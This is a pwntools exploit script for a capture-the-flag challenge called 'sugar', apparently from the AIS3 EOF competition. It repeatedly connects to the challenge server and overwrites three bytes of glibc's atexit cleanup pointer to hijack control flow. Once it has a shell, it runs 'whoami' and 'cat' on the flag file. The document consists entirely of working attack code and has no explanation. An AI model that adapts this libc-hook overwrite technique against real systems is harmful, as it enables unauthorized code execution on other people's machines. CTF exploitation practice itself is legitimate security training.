#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# python3 sugar.py SILENT=1
flag = False
cnt = 0
while not flag :
    # r = process('./sugar')
    r = remote('chals1.eof.ais3.org', 45124)
    print(cnt)
    cnt += 1
    r.sendline(str(0x21000))
    r.sendline('+')

    offset = 0x20f5f8 # __elf_set___libc_atexit_element__IO_cleanup__
    value = 0x3fac7e
    for i in range(3):
        data = str(offset+i) + ' ' + str((value >> (8*i)) & 0xff)
        r.sendline(data)

    r.sendline('A')
    try:
        r.sendline('whoami')
        data = r.recv()
        if b'stack' in data or b'glibc' in data or b'free' in data:
            r.close()
            continue
        r.sendline('cat /home/sugar/flag')
        r.sendline('cat /home/sugar/flag')
        r.sendline('cat /home/sugar/flag')
        print(r.recv())
        r.interactive()
        flag = True
    except:
        r.close()